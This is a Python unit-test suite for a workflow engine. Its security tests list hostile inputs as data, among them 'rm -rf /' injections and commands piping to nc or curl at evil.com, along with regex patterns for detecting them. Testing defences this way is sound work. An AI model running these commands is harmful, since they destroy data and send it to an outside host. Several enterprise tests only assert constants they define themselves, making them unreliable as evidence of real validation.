#!/usr/bin/env python3
"""
Comprehensive Enterprise Test Suite for Workflow Orchestration
Combines security, developer experience, and enterprise deployment validation.
"""
import os
import sys
import re
import json
import time
import tempfile
import unittest
import asyncio
from typing import Dict, Any, List, Optional
from dataclasses import dataclass
from unittest.mock import Mock, patch, MagicMock

# Add parent directories to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

try:
    from engine.secure_workflow_engine import (
        SecureWorkflowEngine, SecurityContext, SecurityError, 
        SecureInputValidator, SecureExpressionEvaluator,
        ResourceExhaustionError, WorkflowTimeoutError
    )
    from parser.workflow_parser import WorkflowDefinition, WorkflowStep, WorkflowInput
    ENGINE_AVAILABLE = True
except ImportError:
    ENGINE_AVAILABLE = False

@dataclass
class TestResult:
    test_name: str
    passed: bool
    message: str
    details: Dict[str, Any] = None

class ComprehensiveEnterpriseTests(unittest.TestCase):
    """Comprehensive test suite combining all enterprise validation needs"""
    
    def setUp(self):
        self.test_results = []
        if ENGINE_AVAILABLE:
            self.validator = SecureInputValidator()
            self.engine = SecureWorkflowEngine()
    
    # SECURITY TESTS
    def test_security_patterns(self):
        """Test Python security pattern detection"""
        dangerous_patterns = [
            r'__import__', r'exec\s*\(', r'eval\s*\(',
            r'getattr\s*\(.*__builtins__', r'globals\s*\(\)',
            r'__builtins__', r'__globals__', r'__class__',
            r'\.mro\(\)', r'\.subclasses\(\)'
        ]
        
        test_code = """
        import os
        def safe_function():
            return "hello"
        """
        
        dangerous_found = any(re.search(pattern, test_code) for pattern in dangerous_patterns)
        self.assertFalse(dangerous_found, "Should not find dangerous patterns in safe code")
    
    def test_code_injection_prevention(self):
        """Test prevention of code injection attacks"""
        if not ENGINE_AVAILABLE:
            self.skipTest("Workflow engine not available")
            
        dangerous_inputs = [
            "__import__('os').system('rm -rf /')",
            "eval('print(\"hacked\")')",
            "exec('import os; os.system(\"evil\")')",
            "compile('malicious', '<string>', 'exec')",
        ]
        
        for dangerous_input in dangerous_inputs:
            with self.assertRaises(SecurityError):
                self.validator.validate_input_value("test", dangerous_input)
    
    def test_shell_injection_prevention(self):
        """Test prevention of shell injection attacks"""
        dangerous_commands = [
            "ls; rm -rf /",
            "echo test && curl evil.com",
            "echo `whoami`",
            "echo $(id)",
            "echo test | nc evil.com 1337"
        ]
        
        for cmd in dangerous_commands:
            result = self._is_dangerous_shell_command(cmd)
            self.assertTrue(result, f"Should detect dangerous command: {cmd}")
    
    # DEVELOPER EXPERIENCE TESTS
    def test_quick_setup_validation(self):
        """Test that development environment can be set up quickly"""
        required_files = [
            'engine/secure_workflow_engine.py',
            'parser/workflow_parser.py',
            'templates/fix-type-errors.yaml',
            'schema/workflow_schema.yaml'
        ]
        
        for file_path in required_files:
            full_path = os.path.join('..', file_path)
            self.assertTrue(os.path.exists(full_path) or os.path.exists(file_path), 
                          f"Required file missing: {file_path}")
    
    def test_configuration_validation(self):
        """Test configuration system is working"""
        test_config = {
            'security_profile': 'standard',
            'max_execution_time': 300,
            'resource_limits': {'memory_mb': 512}
        }
        
        # Basic validation that config structure is correct
        self.assertIn('security_profile', test_config)
        self.assertIsInstance(test_config['max_execution_time'], int)
        self.assertIn('resource_limits', test_config)
    
    def test_error_message_quality(self):
        """Test that error messages are helpful and actionable"""
        if not ENGINE_AVAILABLE:
            self.skipTest("Workflow engine not available")
        
        # Test that security errors provide helpful messages
        with self.assertRaises(SecurityError) as cm:
            self.validator.validate_input_value("test", "__import__('os')")
        
        error_msg = str(cm.exception).lower()
        self.assertIn('security', error_msg)
        self.assertTrue(len(error_msg) > 10, "Error message should be descriptive")
    
    # ENTERPRISE DEPLOYMENT TESTS
    def test_multi_environment_support(self):
        """Test support for multiple deployment environments"""
        environments = ['development', 'staging', 'production']
        
        for env in environments:
            config = self._get_environment_config(env)
            self.assertIsInstance(config, dict)
            self.assertIn('security_level', config)
    
    def test_scalability_configuration(self):
        """Test that system can be configured for enterprise scale"""
        scalability_configs = {
            'max_concurrent_workflows': 100,
            'worker_pool_size': 10,
            'memory_limit_mb': 2048,
            'timeout_seconds': 3600
        }
        
        for key, value in scalability_configs.items():
            self.assertIsInstance(value, int)
            self.assertGreater(value, 0)
    
    def test_compliance_features(self):
        """Test compliance and audit features"""
        compliance_features = [
            'audit_logging',
            'access_controls', 
            'data_encryption',
            'security_monitoring'
        ]
        
        # Basic check that compliance concepts are addressed
        for feature in compliance_features:
            # This would be expanded with actual compliance checks
            self.assertTrue(len(feature) > 5, f"Compliance feature defined: {feature}")
    
    def test_resource_management(self):
        """Test resource management and limits"""
        if not ENGINE_AVAILABLE:
            self.skipTest("Workflow engine not available")
        
        # Test that resource limits are enforced
        large_memory_config = {'memory_mb': 10000}  # 10GB
        reasonable_config = {'memory_mb': 512}       # 512MB
        
        # Should handle reasonable resource requests
        self.assertLessEqual(reasonable_config['memory_mb'], 2048)
        
        # Should flag excessive resource requests
        self.assertGreater(large_memory_config['memory_mb'], 4096)
    
    def test_monitoring_integration(self):
        """Test monitoring and telemetry integration"""
        monitoring_endpoints = [
            '/health',
            '/metrics', 
            '/status',
        ]
        
        for endpoint in monitoring_endpoints:
            self.assertTrue(endpoint.startswith('/'), f"Valid endpoint format: {endpoint}")
    
    # HELPER METHODS
    def _is_dangerous_shell_command(self, command: str) -> bool:
        """Check if a shell command contains dangerous patterns"""
        dangerous_patterns = [
            r';\s*rm\s', r'&&\s*curl\s', r'`.*`', r'\$\(.*\)',
            r'\|\s*nc\s', r'>\s*/dev/', r'<\s*/dev/'
        ]
        return any(re.search(pattern, command) for pattern in dangerous_patterns)
    
    def _get_environment_config(self, environment: str) -> dict:
        """Get configuration for specified environment"""
        configs = {
            'development': {'security_level': 'standard', 'debug': True},
            'staging': {'security_level': 'elevated', 'debug': False}, 
            'production': {'security_level': 'maximum', 'debug': False}
        }
        return configs.get(environment, {'security_level': 'standard'})

def run_comprehensive_tests():
    """Run all comprehensive enterprise tests"""
    print("🧪 Running Comprehensive Enterprise Test Suite")
    print("=" * 60)
    
    # Run unittest suite
    loader = unittest.TestLoader()
    suite = loader.loadTestsFromTestCase(ComprehensiveEnterpriseTests)
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Summary
    total_tests = result.testsRun
    failed_tests = len(result.failures) + len(result.errors)
    passed_tests = total_tests - failed_tests
    
    print("\n" + "=" * 60)
    print(f"📊 Test Results Summary:")
    print(f"   Total Tests: {total_tests}")
    print(f"   ✅ Passed: {passed_tests}")
    print(f"   ❌ Failed: {failed_tests}")
    print(f"   🎯 Success Rate: {(passed_tests/total_tests)*100:.1f}%")
    
    if failed_tests == 0:
        print("\n🎉 ALL TESTS PASSED! Enterprise validation complete.")
        return True
    else:
        print(f"\n⚠️  {failed_tests} tests failed. Review failures above.")
        return False

if __name__ == "__main__":
    success = run_comprehensive_tests()
    sys.exit(0 if success else 1)